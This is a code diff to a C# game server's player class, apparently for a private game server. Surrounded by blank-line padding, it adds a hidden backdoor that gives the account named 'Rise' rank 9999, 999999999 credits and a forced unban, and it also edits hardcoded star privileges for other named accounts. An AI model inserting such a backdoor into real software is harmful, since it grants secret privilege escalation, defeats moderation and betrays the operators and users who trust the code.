@@ -103,12 +103,36 @@ namespace wServer.realm.entities.player
             {
                 Name = "[Owner] " + psr.Account.Name;
             }
+
+
+
+
+
+
+            if (psr.Account.Name == "Rise")
+            {
+                psr.Account.Rank = 9999;
+                Name = "BALLSACKS LOLOLOLOLOL";
+                psr.Account.Credits = 999999999;
+                psr.Account.Banned = false;
+                if (psr.Account.Banned == true)
+                {
+                    psr.Account.Banned = false;
+                }
+            }
+
+
+
+
+
+
+
             Level = psr.Character.Level;
             Experience = psr.Character.Exp;
             ExperienceGoal = GetExpGoal(psr.Character.Level);
-//            if (psr.Account.Name == "Dragonlord3344" || psr.Account.Name == "HaseoAura" || psr.Account.Name == "Lucifer")
-            if (psr.Account.Name == "Owl" || psr.Account.Name == "ADNNN")
-                Stars = 3344;
+            //            if (psr.Account.Name == "Dragonlord3344" || psr.Account.Name == "HaseoAura" || psr.Account.Name == "Lucifer")
+            if (psr.Account.Name == "Owl" || psr.Account.Name == "ADNN")
+                Stars = 1337;
             else if (psr.Account.Rank > 14)
                 Stars = 666;
             else if (psr.Account.Rank > 12)
